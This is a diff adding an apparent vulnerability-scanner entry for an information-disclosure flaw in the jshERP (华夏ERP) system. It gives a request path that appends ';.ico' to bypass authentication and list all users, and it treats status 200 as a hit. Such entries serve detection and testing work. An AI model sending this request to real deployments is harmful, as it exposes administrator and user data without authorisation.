@@ -1,0 +1,3 @@
+name: "华夏ERP管理员信息泄露漏洞"
+poc: "/jshERP-boot/user/getAllList;.ico"
+status_code: 200
